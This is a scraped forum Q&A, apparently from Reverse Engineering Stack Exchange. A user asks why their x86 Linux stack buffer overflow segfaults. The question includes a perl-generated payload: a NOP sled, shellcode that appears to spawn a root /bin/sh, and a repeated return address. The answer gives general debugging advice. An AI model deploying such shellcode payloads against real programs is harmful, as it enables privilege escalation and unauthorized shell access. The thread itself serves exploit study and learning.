{
    "title": "My nopsled getting Segmentation fault (core dumped)",
    "link": "https://reverseengineering.stackexchange.com/questions/14525/my-nopsled-getting-segmentation-fault-core-dumped",
    "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  After overwrite the\n  <code>\n   EIP\n  </code>\n  register, I try\n  <code>\n   breakpoint\n  </code>\n  on the function\n  <code>\n   strcpy()\n  </code>\n  and then run the program after a\n  <code>\n   breakpoint\n  </code>\n  in the\n  <code>\n   debugger\n  </code>\n  .\n </p>\n <p>\n  Then I check the\n  <code>\n   ESP\n  </code>\n  register :\n </p>\n <pre><code>(gdb) i r esp\nesp            0xbffff268   0xbffff268\n</code></pre>\n <p>\n  In\n  <code>\n   0xbffff268\n  </code>\n  I subtract address (say,\n  <code>\n   300\n  </code>\n  ) :\n </p>\n <p>\n  <code>\n   0xbffff268\n  </code>\n  -\n  <code>\n   300\n  </code>\n  =\n  <code>\n   0xbffff13c\n  </code>\n </p>\n <p>\n  In the form of little endian =\n  <code>\n   \\x3c\\xf1\\xff\\xbf\n  </code>\n </p>\n <p>\n  After the address in the calculations, the address will be used in nopsled I created\n </p>\n <p>\n  <code>\n   NOPSLED + SHELLCODE + ESP\n  </code>\n </p>\n <p>\n  so my exploit is :\n </p>\n <pre><code>`perl -e 'print \"\\x90\" x 200 . \"\\xb0\\x17\\x31\\xdb\\xcd\\x80\\xb0\\x0b\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xcd\\x80\" . \"\\x3c\\xf1\\xff\\xbf\" x 45'`\n</code></pre>\n <p>\n  When executed using the\n  <code>\n   debugger\n  </code>\n  and then typing\n  <code>\n   c\n  </code>\n  in the\n  <code>\n   debugger\n  </code>\n  , I get\n  <code>\n   Segmentation fault (core dumped)\n  </code>\n  at the address\n  <code>\n   ESP\n  </code>\n  register.\n </p>\n <p>\n  Why my exploit doesn't work ?\n </p>\n</div>\n</body></html>",
    "votes": "0",
    "answers": 1,
    "views": "450",
    "tags": [
        "x86",
        "linux",
        "exploit",
        "buffer-overflow",
        "shellcode"
    ],
    "user": "Febriyanto Nugroho",
    "time": "Jan 30, 2017 at 4:03",
    "comments": [
        {
            "user": "julian",
            "text": "<html><body><span class=\"comment-copy\">\n Can you provide the source code of the program you are trying to exploit?\n</span>\n</body></html>",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "<html><body><div class=\"s-prose js-post-body\" itemprop=\"text\">\n <p>\n  Stack growing downwards try adding that value, make sure your payload in a executable area and your calculations right (which we don't know how you do it). Buffer overflow doesn't mean unlimited unfragmented override, check your payload's integrity. If you can share your code we can examine and understand your problem better.\n </p>\n</div>\n</body></html>",
            "votes": "1",
            "user": "Kerim Can Kalıpcıoğlu",
            "time": "Aug 2, 2017 at 13:15",
            "is_accepted": true,
            "comments": []
        }
    ]
}